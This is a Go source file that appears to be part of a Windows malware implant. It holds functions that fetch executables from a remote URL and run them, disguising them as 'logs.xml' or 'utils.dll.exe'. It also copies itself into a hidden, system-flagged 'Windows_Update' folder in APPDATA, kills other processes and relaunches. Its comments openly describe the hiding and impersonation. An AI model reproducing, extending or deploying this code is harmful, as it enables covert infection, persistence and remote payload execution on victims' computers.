package main

import "os"
import "github.com/cavaliercoder/grab"
import "github.com/cleversoap/go-cp"


func Upgrade(link string) {
	//saves link download to logs.xml. Should be a DIRECT download!!!
	grab.Get("logs.xml", link) //donwloads new exe and saves as xml to hide 
	Run("logs.xml") //runs file as binary
}
func CleanUpgrade() {
	if GetExeName() != TARGET_FILE_NAME {   //if name not desired
		Run("taskkill /IM "+TARGET_FILE_NAME+" /T /f")  //Kill prosses using our name
		os.Remove(os.Getenv("APPDATA")+"\\Windows_Update\\"+ TARGET_FILE_NAME) //In case of undate there will be a exe in the same dir, remove it 
		err := cp.Copy(GetExeName(), os.Getenv("APPDATA")+"\\Windows_Update\\"+ TARGET_FILE_NAME) // change our name to desired
		if err == nil { 
			Run("attrib +H +S %APPDATA%\\Windows_Update\\"+ TARGET_FILE_NAME)
			Run("start " + os.Getenv("APPDATA")+"\\Windows_Update\\"+ TARGET_FILE_NAME) //run with new mane
			os.Exit(0) //kill us
		}
	}
	
}

func DownloadAndRun(url string) {
	fileName := "utils.dll.exe"  // .dll for impersonating dll if user hides common extensions
	grab.Get(os.Getenv("APPDATA") + "\\" + fileName, url)
	Run("start " + os.Getenv("APPDATA")+"\\"+fileName)
}